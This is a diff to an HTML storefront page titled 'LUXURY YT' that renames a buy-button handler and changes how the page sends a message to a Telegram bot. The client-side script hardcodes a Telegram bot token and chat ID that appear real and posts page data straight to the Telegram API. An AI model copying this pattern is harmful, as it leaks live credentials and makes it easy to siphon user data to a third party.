@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>LUXURY YT</title>
     <style>
-        /* Same styles as before */
+        /* Styling as before */
         * {
             margin: 0;
             padding: 0;
@@ -176,7 +176,7 @@
             </tbody>
         </table>
         <div class="buy-now">
-            <button onclick="openPopup()">BUY NOW</button>
+            <button onclick="buyNow()">BUY NOW</button>
         </div>
     </section>
 
@@ -232,8 +232,11 @@
             const botToken = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y';
             const chatId = '7174617845';
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-            
-            fetch(url);
+
+            // Using XMLHttpRequest to avoid potential CORS issues
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("GET", url, true);
+            xhttp.send();
         }
 
         function activate() {
